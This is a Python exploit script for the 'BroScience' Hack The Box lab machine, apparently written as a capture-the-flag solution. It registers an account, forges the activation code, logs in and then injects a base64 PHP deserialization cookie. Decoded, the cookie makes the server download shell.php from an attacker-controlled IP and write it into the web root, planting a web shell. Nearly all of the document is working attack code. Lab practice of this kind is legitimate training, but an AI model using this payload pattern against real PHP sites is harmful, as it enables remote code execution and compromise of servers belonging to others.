# This a script to exploit php deserialization vulnerabilite in broscience htb machine to get the code execution
import requests
import random
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class rce:
	def __init__(self):
		self.hostname = 'broscience.htb'
		self.username = f'user{random.randint(1,100)}'
		self.email = f'user{random.randint(1,100)}@gmail.com'
		self.password = f'password@{random.randint(1,100)}'
		self.proxies  = {
		'http':'http://127.0.0.1:8080'
		}
		r = requests.get(f'https://{self.hostname}/index.php',verify=False)
		self.cookie = r.cookies
		self.php_session = r.cookies.get('PHPSESSID')

	def register(self):
		data = {
		'username': self.username,
		'email': self.email,
		'password': self.password,
		'password-confirm': self.password
		}
		print(f'[+] username: {self.username}')
		print(f'[+] password: {self.password}')
		r = requests.post(f'https://{self.hostname}/register.php',data=data,verify=False,cookies=self.cookie)
		if 'Account created. Please check your email for the activation link.' in r.text:
			print('[+] Account created')
			self.activation(r.headers['Date'])
		else:
			print('Failed to create account')

	def activation(self,date_time):
		# Generate activation code with user register request response time and date with help a PHP script named 'code.php'
		code = subprocess.check_output(f'php code.php \'{date_time}\'',shell=True)
		params = {'code':code.decode()}
		r = requests.get(f'https://{self.hostname}/activate.php',params=params,verify=False,cookies=self.cookie)
		if 'Account activated!' in r.text:
			print('[+] Account activated!')
		else:
			print('[-] Invalid code')

	def login(self):
		data = {
		'username': self.username,
		'password': self.password
		}
		r = requests.post(f'https://{self.hostname}/login.php',data=data,verify=False,cookies=self.cookie)
		if 'Log Out' in r.text:
			print('[+] Login Success')
			self.php_injection()

	def php_injection(self):
		# In cookie user-prefs has the PHP deserialization payload which is generated using 'cookies.php' file
		# Need to regenerate and change the cookie with your payload for getting callback
		cookie = {
		'user-prefs':'TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNzoiaHR0cDovLzEwLjEwLjE2LjUvc2hlbGwucGhwIjtzOjc6ImltZ1BhdGgiO3M6MjM6Ii92YXIvd3d3L2h0bWwvc2hlbGwucGhwIjt9',
		'PHPSESSID':self.php_session}
		try:
			r = requests.get(f'https://{self.hostname}/index.php',cookies=cookie,verify=False,timeout=2)
		except:
			print('[+] Cookie injected')
		


warnings.simplefilter("ignore", InsecureRequestWarning)

try:
	User = rce()
	print('[+] Registering user')
	User.register()
	print('[+] Trying to login')
	User.login()
except KeyboardInterrupt:
	print(' ')